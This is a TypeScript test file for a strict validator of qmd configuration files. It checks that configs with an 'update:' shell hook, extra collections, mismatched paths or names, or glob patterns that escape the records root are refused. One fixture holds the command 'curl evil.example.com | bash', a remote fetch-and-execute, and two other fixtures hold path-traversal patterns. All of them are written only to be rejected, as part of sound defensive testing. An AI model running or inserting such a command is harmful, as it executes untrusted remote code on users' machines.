// Item 1 of the adversarial review: the bound qmd config is executable
// content — qmd runs any collection's `update:` field via `bash -c` on
// every `qmd update`. validateBoundQmdConfig is a deliberately strict,
// allowlist-only reader that refuses anything outside the exact shape
// `qmd collection add` produces for a single collection.

import assert from "node:assert/strict";
import { existsSync } from "node:fs";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { homedir, tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { after, before, test } from "node:test";
import {
  defaultQmdCacheHome,
  defaultQmdConfigDir,
  isDefaultQmdCacheHome,
  isDefaultQmdConfigDir,
  validateBoundQmdConfig,
} from "../src/qmdConfigGuard.ts";
import type { SpaceBinding } from "../src/spaceBinding.ts";

let dir: string;

before(async () => {
  dir = await mkdtemp(join(tmpdir(), "engram-qmd-config-guard-test-"));
});

after(async () => {
  await rm(dir, { recursive: true, force: true });
});

test("isDefaultQmdConfigDir recognizes the real ~/.config/qmd path", async () => {
  assert.equal(await isDefaultQmdConfigDir(resolve(homedir(), ".config", "qmd")), true);
  assert.equal(await isDefaultQmdConfigDir("/some/other/path"), false);
});

test("defaultQmdConfigDir resolves under the real home directory", () => {
  assert.equal(defaultQmdConfigDir(), resolve(homedir(), ".config", "qmd"));
});

test("isDefaultQmdCacheHome recognizes the real ~/.cache path", async () => {
  assert.equal(await isDefaultQmdCacheHome(resolve(homedir(), ".cache")), true);
  assert.equal(await isDefaultQmdCacheHome("/some/other/path"), false);
});

test("defaultQmdCacheHome resolves under the real home directory", () => {
  assert.equal(defaultQmdCacheHome(), resolve(homedir(), ".cache"));
});

// Fix 2 (adversarial review, cycle 3): the check must catch this via
// filesystem identity, not string comparison. Verified directly on this
// machine: fs.realpathSync does NOT collapse the firmlink alias back to
// /Users/<user>/..., but stat() dev+ino do match. Skips gracefully on a
// non-macOS environment where this alias doesn't exist.
test("isDefaultQmdConfigDir catches the real macOS firmlink alias, which compares unequal as a string", async (t) => {
  const firmlinkAlias = join("/System/Volumes/Data", defaultQmdConfigDir());
  if (!existsSync(firmlinkAlias)) {
    t.skip("no /System/Volumes/Data firmlink alias on this machine");
    return;
  }
  assert.notEqual(firmlinkAlias, defaultQmdConfigDir(), "precondition: the two paths must differ as strings");
  assert.equal(await isDefaultQmdConfigDir(firmlinkAlias), true);
});

test("isDefaultQmdCacheHome catches the real macOS firmlink alias, which compares unequal as a string", async (t) => {
  const firmlinkAlias = join("/System/Volumes/Data", defaultQmdCacheHome());
  if (!existsSync(firmlinkAlias)) {
    t.skip("no /System/Volumes/Data firmlink alias on this machine");
    return;
  }
  assert.notEqual(firmlinkAlias, defaultQmdCacheHome(), "precondition: the two paths must differ as strings");
  assert.equal(await isDefaultQmdCacheHome(firmlinkAlias), true);
});

function binding(recordsRoot: string, collectionName: string): SpaceBinding {
  return { recordsRoot, qmdConfigDir: "/unused", qmdCacheHome: "/unused", qmdCollectionName: collectionName };
}

test("accepts a well-formed single-collection config matching the binding", async () => {
  const recordsRoot = join(dir, "records");
  await mkdir(recordsRoot, { recursive: true });
  const configPath = join(dir, "index.yml");
  await writeFile(
    configPath,
    `collections:\n  space-a:\n    path: ${recordsRoot}\n    pattern: "*.md"\n`,
    "utf8",
  );

  const result = await validateBoundQmdConfig(configPath, binding(recordsRoot, "space-a"));
  assert.equal(result.ok, true);
});

test("refuses a config declaring an 'update:' field, regardless of nesting", async () => {
  const recordsRoot = join(dir, "records-update");
  await mkdir(recordsRoot, { recursive: true });
  const configPath = join(dir, "index-update.yml");
  await writeFile(
    configPath,
    `collections:\n  space-a:\n    path: ${recordsRoot}\n    pattern: "*.md"\n    update: "curl evil.example.com | bash"\n`,
    "utf8",
  );

  const result = await validateBoundQmdConfig(configPath, binding(recordsRoot, "space-a"));
  assert.equal(result.ok, false);
  if (result.ok) return;
  assert.ok(result.errors.some((e) => e.includes("update:")));
});

test("refuses a config with more than one collection", async () => {
  const recordsRoot = join(dir, "records-multi");
  await mkdir(recordsRoot, { recursive: true });
  const configPath = join(dir, "index-multi.yml");
  await writeFile(
    configPath,
    `collections:\n  space-a:\n    path: ${recordsRoot}\n    pattern: "*.md"\n  space-b:\n    path: /somewhere/else\n    pattern: "*.md"\n`,
    "utf8",
  );

  const result = await validateBoundQmdConfig(configPath, binding(recordsRoot, "space-a"));
  assert.equal(result.ok, false);
  if (result.ok) return;
  assert.ok(result.errors.some((e) => e.includes("exactly one collection")));
});

test("refuses a config whose collection name does not match the binding", async () => {
  const recordsRoot = join(dir, "records-name-mismatch");
  await mkdir(recordsRoot, { recursive: true });
  const configPath = join(dir, "index-name-mismatch.yml");
  await writeFile(configPath, `collections:\n  other-name:\n    path: ${recordsRoot}\n    pattern: "*.md"\n`, "utf8");

  const result = await validateBoundQmdConfig(configPath, binding(recordsRoot, "space-a"));
  assert.equal(result.ok, false);
});

test("refuses a config whose collection path does not match the bound records root", async () => {
  const recordsRoot = join(dir, "records-path-mismatch");
  await mkdir(recordsRoot, { recursive: true });
  const configPath = join(dir, "index-path-mismatch.yml");
  await writeFile(configPath, `collections:\n  space-a:\n    path: /somewhere/completely/else\n    pattern: "*.md"\n`, "utf8");

  const result = await validateBoundQmdConfig(configPath, binding(recordsRoot, "space-a"));
  assert.equal(result.ok, false);
});

test("refuses a config with an unexpected top-level key", async () => {
  const recordsRoot = join(dir, "records-top-level");
  await mkdir(recordsRoot, { recursive: true });
  const configPath = join(dir, "index-top-level.yml");
  await writeFile(
    configPath,
    `collections:\n  space-a:\n    path: ${recordsRoot}\n    pattern: "*.md"\nglobal_context: "sneaky"\n`,
    "utf8",
  );

  const result = await validateBoundQmdConfig(configPath, binding(recordsRoot, "space-a"));
  assert.equal(result.ok, false);
});

test("refuses a config with an unexpected field on the collection", async () => {
  const recordsRoot = join(dir, "records-extra-field");
  await mkdir(recordsRoot, { recursive: true });
  const configPath = join(dir, "index-extra-field.yml");
  await writeFile(
    configPath,
    `collections:\n  space-a:\n    path: ${recordsRoot}\n    pattern: "*.md"\n    context:\n      "/": "sneaky"\n`,
    "utf8",
  );

  const result = await validateBoundQmdConfig(configPath, binding(recordsRoot, "space-a"));
  assert.equal(result.ok, false);
});

// Cycle-two review: the guard validated the collection's name and path but
// permitted ANY pattern. qmd hands the pattern to Bun.Glob.scan({ cwd }),
// and Bun resolves parent-relative patterns out of that cwd — verified
// directly: scanning "../**/*.md" from a records root returns sibling files.
// The symlink guard cannot see this; the tree is clean and the pattern is
// the escape.

test("a collection pattern with a .. segment is refused", async () => {
  const recordsRoot = join(dir, "escaping-pattern-root");
  await mkdir(recordsRoot, { recursive: true });
  const configPath = join(dir, "escaping-pattern.yml");
  await writeFile(
    configPath,
    `collections:\n  space-a:\n    path: ${recordsRoot}\n    pattern: "../../**/*.md"\n`,
    "utf8",
  );

  const result = await validateBoundQmdConfig(configPath, binding(recordsRoot, "space-a"));
  assert.equal(result.ok, false);
  if (result.ok) return;
  assert.ok(
    result.errors.some((e) => e.includes("escapes the records root")),
    `expected an escape error, got: ${JSON.stringify(result.errors)}`,
  );
});

test("an absolute collection pattern is refused", async () => {
  const recordsRoot = join(dir, "absolute-pattern-root");
  await mkdir(recordsRoot, { recursive: true });
  const configPath = join(dir, "absolute-pattern.yml");
  await writeFile(
    configPath,
    `collections:\n  space-a:\n    path: ${recordsRoot}\n    pattern: "/Users/**/*.md"\n`,
    "utf8",
  );

  const result = await validateBoundQmdConfig(configPath, binding(recordsRoot, "space-a"));
  assert.equal(result.ok, false);
  if (result.ok) return;
  assert.ok(
    result.errors.some((e) => e.includes("not absolute")),
    `expected an absolute-path error, got: ${JSON.stringify(result.errors)}`,
  );
});

test("an ordinary recursive markdown pattern is still accepted", async () => {
  const recordsRoot = join(dir, "ordinary-pattern-root");
  await mkdir(recordsRoot, { recursive: true });
  const configPath = join(dir, "ordinary-pattern.yml");
  await writeFile(
    configPath,
    `collections:\n  space-a:\n    path: ${recordsRoot}\n    pattern: "**/*.md"\n`,
    "utf8",
  );

  const result = await validateBoundQmdConfig(configPath, binding(recordsRoot, "space-a"));
  assert.equal(result.ok, true, `expected acceptance, got: ${JSON.stringify(result)}`);
});
